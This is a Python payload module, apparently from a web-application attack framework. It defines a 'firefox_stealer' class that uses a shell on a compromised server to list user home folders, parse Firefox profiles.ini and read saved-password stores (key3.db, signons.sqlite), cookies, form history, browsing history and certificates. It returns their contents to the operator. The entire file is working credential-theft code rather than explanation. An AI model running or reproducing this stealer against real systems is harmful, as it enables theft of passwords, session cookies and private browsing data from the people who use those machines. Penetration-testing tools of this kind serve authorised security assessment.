import re
from plugins.attack.payloads.base_payload import base_payload
import core.controllers.outputManager as om

#TODO: Provide support for downloading
class firefox_stealer(base_payload):
    '''
    This payload steals Mozilla Firefox information
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('bookmarks.html')
        files.append('content-prefs.sqlite')
        files.append('cookies.sqlite')
        files.append('cookies.sqlite-journal')
        files.append('downloads.sqlite')
        files.append('permissions.sqlite')
        files.append('key3.db')
        files.append('signons.sqlite')
        files.append('cert8.db')
        files.append('formhistory.sqlite')
        files.append('places.sqlite')

        def parse_mozilla_dir_path (profile):
            path = re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
            if path:
                return path
            else:
                return []

        users_folders = self.exec_payload('users').values()
        for users in users_folders:
            list = parse_mozilla_dir_path(self.shell.read(users+'.mozilla/firefox/profiles.ini'))
            if list:
                for folder in list:
                    for file in files:
                        content = self.shell.read(users+'.mozilla/firefox/'+folder+'/'+file)
                        if content:
                            result.update({users+'.mozilla/firefox/'+folder+'/'+file:content})

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})

        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('Firefox Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)

        if result == [ ]:
            result.append('Server is configured correctly, cant steal firefox information.')
        return result
